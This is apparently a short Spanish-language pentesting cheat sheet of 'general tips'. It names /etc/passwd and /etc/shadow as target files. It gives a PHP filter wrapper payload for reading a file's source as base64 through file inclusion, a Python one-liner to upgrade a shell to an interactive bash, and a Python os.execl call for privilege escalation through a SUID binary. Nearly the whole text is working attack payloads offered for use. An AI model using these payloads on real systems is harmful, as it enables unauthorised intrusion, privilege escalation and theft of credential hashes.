# Tips generales

### Directorios Principales

`etc/passwd`
`etc/shadow`

## PHP

### Encodear
`php://filter/convert.base64-encode/resource=FILENAME`

## Python

### Upgrade the shell  
`python -c 'import pty; pty.spawn("/bin/bash")'`

### Priv Esc

`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

